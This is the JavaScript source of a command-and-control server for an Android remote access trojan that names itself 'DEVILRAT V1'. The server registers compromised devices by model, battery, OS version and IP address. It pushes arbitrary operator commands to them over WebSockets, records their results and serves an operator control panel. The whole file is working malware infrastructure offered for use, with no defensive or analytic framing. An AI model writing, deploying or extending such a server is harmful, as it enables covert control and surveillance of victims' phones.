const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Database
const db = new sqlite3.Database(':memory:');
db.serialize(() => {
  db.run(`
    CREATE TABLE devices (
      id TEXT PRIMARY KEY,
      model TEXT,
      battery TEXT,
      android TEXT,
      ip TEXT,
      status TEXT,
      connected_at DATETIME,
      last_seen DATETIME
    )
  `);
  
  db.run(`
    CREATE TABLE commands (
      id TEXT PRIMARY KEY,
      device_id TEXT,
      command TEXT,
      params TEXT,
      status TEXT,
      created_at DATETIME,
      executed_at DATETIME
    )
  `);
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// DEVILRAT Database in memory
const devices = new Map();
const commands = new Map();

// API Routes
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    service: 'DEVILRAT V1 - Koyeb',
    devices: devices.size,
    uptime: process.uptime()
  });
});

app.get('/api/devices', (req, res) => {
  const deviceList = Array.from(devices.values()).map(device => ({
    ...device,
    isOnline: Date.now() - device.lastSeen < 30000
  }));
  res.json(deviceList);
});

app.post('/api/device/register', (req, res) => {
  const deviceId = uuidv4();
  const deviceInfo = {
    id: deviceId,
    model: req.body.model || 'Unknown',
    battery: req.body.battery || '100%',
    android: req.body.android || 'Unknown',
    ip: req.ip,
    status: 'online',
    connectedAt: new Date().toISOString(),
    lastSeen: Date.now(),
    socketId: null
  };
  
  devices.set(deviceId, deviceInfo);
  
  // Insert to DB
  db.run(
    'INSERT INTO devices (id, model, battery, android, ip, status, connected_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
    [deviceId, deviceInfo.model, deviceInfo.battery, deviceInfo.android, deviceInfo.ip, 'online', new Date().toISOString()]
  );
  
  io.emit('device_connected', deviceInfo);
  res.json({ status: 'registered', deviceId });
});

app.post('/api/command', (req, res) => {
  const { deviceId, command, params } = req.body;
  const device = devices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const commandId = uuidv4();
  const commandData = {
    id: commandId,
    deviceId,
    command,
    params,
    status: 'pending',
    createdAt: new Date().toISOString()
  };
  
  commands.set(commandId, commandData);
  
  // Send to device via socket if connected
  if (device.socketId) {
    io.to(device.socketId).emit('command', commandData);
  }
  
  // Save to DB
  db.run(
    'INSERT INTO commands (id, device_id, command, params, status, created_at) VALUES (?, ?, ?, ?, ?, ?)',
    [commandId, deviceId, command, JSON.stringify(params), 'pending', new Date().toISOString()]
  );
  
  res.json({ status: 'sent', commandId });
});

// WebSocket
io.on('connection', (socket) => {
  console.log('New connection:', socket.id);
  
  socket.on('register_device', (data) => {
    const deviceId = data.deviceId || uuidv4();
    const deviceInfo = {
      id: deviceId,
      model: data.model || 'Unknown',
      battery: data.battery || '100%',
      android: data.android || 'Unknown',
      ip: socket.handshake.address,
      status: 'online',
      connectedAt: new Date().toISOString(),
      lastSeen: Date.now(),
      socketId: socket.id
    };
    
    devices.set(deviceId, deviceInfo);
    socket.deviceId = deviceId;
    
    socket.emit('registered', { deviceId });
    io.emit('device_update', deviceInfo);
  });
  
  socket.on('command_response', (data) => {
    const { commandId, result } = data;
    const command = commands.get(commandId);
    
    if (command) {
      command.status = 'completed';
      command.result = result;
      command.executedAt = new Date().toISOString();
      
      // Update DB
      db.run(
        'UPDATE commands SET status = ?, executed_at = ? WHERE id = ?',
        ['completed', new Date().toISOString(), commandId]
      );
      
      io.emit('command_completed', command);
    }
  });
  
  socket.on('heartbeat', (deviceId) => {
    const device = devices.get(deviceId);
    if (device) {
      device.lastSeen = Date.now();
      device.status = 'online';
    }
  });
  
  socket.on('disconnect', () => {
    const deviceId = socket.deviceId;
    if (deviceId) {
      const device = devices.get(deviceId);
      if (device) {
        device.status = 'offline';
        device.socketId = null;
        io.emit('device_update', device);
      }
    }
  });
});

// Serve Web Panel
app.get('/panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/', (req, res) => {
  res.redirect('/panel');
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
  👹 DEVILRAT V1 - KOYEB EDITION
  📡 Server running on port ${PORT}
  🔗 Web Panel: http://localhost:${PORT}/panel
  ⚡ WebSocket: ws://localhost:${PORT}
  🛐 KEGELAPAN ABADI!
  `);
});
